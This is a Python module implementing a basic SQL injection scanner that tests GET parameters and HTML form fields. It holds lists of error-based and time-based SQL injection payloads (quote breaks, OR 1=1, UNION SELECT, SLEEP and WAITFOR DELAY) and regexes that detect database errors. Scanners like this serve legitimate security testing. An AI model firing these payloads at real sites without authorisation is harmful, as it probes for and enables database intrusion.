"""Simple SQL injection scanner module.

This module provides a lightweight `SQLiScanner` that can test GET parameters
and HTML form inputs for common error-based and time-based SQLi payloads.

It is intended for integration into a vulnerability scanning pipeline — it does
not attempt sophisticated evasion or advanced payload crafting, but provides
clear, auditable detections and evidence suitable for triage.
"""
from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional

import requests


# Error-based and time-based payload lists (from spec)
ERROR_PAYLOADS = [
    "'",  # Simple unclosed quote - causes immediate error
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' AND 1=2--",
]

TIME_PAYLOADS = [
    "' OR SLEEP(5)--",
    "' AND BENCHMARK(5000000,MD5('" + "test" + "'))--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR pg_sleep(5)--",
]

# Database error regex patterns (case-insensitive)
# Database error regex patterns (case-insensitive)
ERROR_PATTERNS = [
    r"SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result",
    r"PostgreSQL.*ERROR|Warning.*pg_",
    r"Driver.*SQL Server|OLE DB.*SQL Server|ODBC SQL Server",
    r"ORA-[0-9]+|Oracle error|Oracle.*Driver",
    r"sqlite|database error|unrecognized token|UNION.*columns|syntax error",  # Added SQLite patterns
]

class SQLiScanner:
    """Scanner for simple SQL injection tests.

    Methods perform per-parameter tests and return a list of
    vulnerability records matching the project's return format.
    """

    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
        """Create a scanner.

        Args:
            timeout: Base timeout (seconds) for network requests.
        """
        self.timeout = timeout
        # Use provided session (authenticated) or create new one
        if session:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test GET parameters for SQL injection vulnerabilities.

        Args:
            url: The endpoint URL to test.
            params: Dictionary of query parameters (name -> value).

        Returns:
            A list of vulnerability dicts. Empty list if none found.
        """
        findings: List[Dict[str, Any]] = []

        for param_name in params.keys():
            original_value = str(params.get(param_name, ""))

            # Error-based tests
            print(f"Testing {param_name} with error-based payloads...")
            for payload in ERROR_PAYLOADS:
                vuln = self._test_error_based(url, param_name, original_value, params, payload)
                if vuln:
                    findings.append(vuln)
                    # Move to next parameter after confirmed vuln
                    break

            # Time-based tests (only if no error-based vuln found for this param)
            if any(f['param'] == param_name for f in findings):
                continue

            print(f"Testing {param_name} with time-based payloads...")
            for payload in TIME_PAYLOADS:
                vuln = self._test_time_based(url, param_name, original_value, params, payload)
                if vuln:
                    findings.append(vuln)
                    break

        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test HTML form inputs for SQL injection.

        Expected `form_data` structure:
        {
            'action': 'https://example.com/login',
            'method': 'POST',
            'inputs': [{'name': 'username'}, {'name': 'password'}]
        }

        Returns:
            A list of vulnerability dicts. Empty list if none found.
        """
        findings: List[Dict[str, Any]] = []

        action = form_data.get("action")
        method = (form_data.get("method") or "GET").upper()
        inputs = form_data.get("inputs", [])

        if not action or not inputs:
            return findings

        # Build a baseline data dict with empty values where missing
        baseline = {inp.get("name", ""): "" for inp in inputs if inp.get("name")}

        for param_name in baseline.keys():
            original_value = baseline.get(param_name, "")

            # Error-based
            print(f"Testing form param {param_name} with error-based payloads...")
            for payload in ERROR_PAYLOADS:
                vuln = self._test_error_based(action, param_name, original_value, baseline, payload, method=method)
                if vuln:
                    findings.append(vuln)
                    break

            if any(f['param'] == param_name for f in findings):
                continue

            # Time-based
            print(f"Testing form param {param_name} with time-based payloads...")
            for payload in TIME_PAYLOADS:
                vuln = self._test_time_based(action, param_name, original_value, baseline, payload, method=method)
                if vuln:
                    findings.append(vuln)
                    break

        return findings

    def _test_error_based(
        self,
        test_url: str,
        param_name: str,
        original_value: str,
        params: Dict[str, Any],
        payload: str,
        method: str = "GET",
    ) -> Optional[Dict[str, Any]]:
        """Inject an error-based payload and look for DB error messages.

        Returns a vulnerability dict if detected, otherwise None.
        """
        try:
            injected = original_value + payload if original_value else payload
            data = params.copy()
            data[param_name] = injected

            if method.upper() == "GET":
                resp = self.session.get(test_url, params=data, timeout=self.timeout)
            else:
                resp = self.session.post(test_url, data=data, timeout=self.timeout)

            text = resp.text or ""
            matched = self._detect_sql_errors(text)
            if matched:
                print(f"Error-based SQLi detected on {param_name} using payload: {payload}")
                return {
                    "vulnerable": True,
                    "type": "error-based",
                    "param": param_name,
                    "payload": payload,
                    "evidence": matched,
                    "confidence": 95,
                }
        except requests.RequestException as exc:
            print(f"Request failed during error-based test for {param_name}: {exc}")
        return None

    def _test_time_based(
        self,
        test_url: str,
        param_name: str,
        original_value: str,
        params: Dict[str, Any],
        payload: str,
        method: str = "GET",
    ) -> Optional[Dict[str, Any]]:
        """Inject a time-based payload and measure response time.

        Flags vulnerability if response time exceeds ~4 seconds.
        """
        try:
            injected = original_value + payload if original_value else payload
            data = params.copy()
            data[param_name] = injected

            # Increase timeout to allow for server-side sleep
            request_timeout = max(self.timeout + 5, 15)

            start = time.time()
            if method.upper() == "GET":
                _ = self.session.get(test_url, params=data, timeout=request_timeout)
            else:
                _ = self.session.post(test_url, data=data, timeout=request_timeout)
            elapsed = time.time() - start

            if elapsed >= 4.0:
                print(f"Time-based SQLi detected on {param_name} using payload: {payload} (elapsed={elapsed:.2f}s)")
                return {
                    "vulnerable": True,
                    "type": "time-based",
                    "param": param_name,
                    "payload": payload,
                    "evidence": f"response_time={elapsed:.2f}s",
                    "confidence": 75,
                }
        except requests.RequestException as exc:
            print(f"Request failed during time-based test for {param_name}: {exc}")
        return None

    def _detect_sql_errors(self, response_text: str) -> Optional[str]:
        """Search response text for known DB error messages.

        Returns the matching snippet or None if nothing found.
        """
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        return None
